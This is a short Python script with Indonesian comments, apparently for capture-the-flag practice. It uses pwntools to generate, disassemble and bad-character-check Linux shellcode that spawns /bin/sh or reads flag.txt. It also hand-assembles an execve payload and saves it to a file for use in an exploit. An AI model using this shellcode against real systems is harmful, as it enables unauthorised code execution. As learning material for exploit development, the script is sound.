# Script untuk generate & analisis shellcode dengan pwntools.
# Jalankan: python3 shellcode_gen.py

from pwn import *

# ===== Konfigurasi =====
context.arch = "amd64"   # ganti "i386" untuk 32-bit
context.os = "linux"

# ===== 1. Generate shellcode =====
print("[*] Shellcode execve('/bin/sh'):")
sc = asm(shellcraft.sh())
print(f"[+] Panjang: {len(sc)} bytes")
print(f"[+] Hex    : {sc.hex()}")
print("[+] Disassembly:")
print(disasm(sc))

# ===== 2. Shellcode lain =====
print("\n[*] Variasi shellcode:")
variants = {
    "cat flag.txt": shellcraft.cat("flag.txt"),
    "execve /bin/sh": shellcraft.sh(),
}

for name, sc_asm in variants.items():
    b = asm(sc_asm)
    print(f"[+] {name}: {len(b)} bytes -> {b.hex()[:80]}...")

# ===== 3. Cek karakter terlarang =====
print("\n[*] Cek karakter terlarang (newline/null):")
bad = b"\x0a\x00"
sc = asm(shellcraft.sh())
if any(c in sc for c in bad):
    print("[!] Ada karakter terlarang! (masalah kalau lewat gets/strcpy)")
else:
    print("[+] Bersih dari \\x0a dan \\x00 - aman untuk gets")

# ===== 4. Manual assembly =====
print("\n[*] Shellcode manual (tanpa shellcraft):")
manual = asm("""
    xor rsi, rsi
    push rsi
    mov rdi, 0x68732f2f6e69622f
    push rdi
    mov rdi, rsp
    xor rdx, rdx
    mov al, 59
    syscall
""")
print(f"[+] Hex: {manual.hex()}")
print(f"[+] Sama dengan shellcraft.sh()? {manual == sc}")

# ===== 5. Simpan ke file (untuk dipakai di exploit) =====
with open("shellcode.bin", "wb") as f:
    f.write(sc)
print("\n[+] Tersimpan ke shellcode.bin")
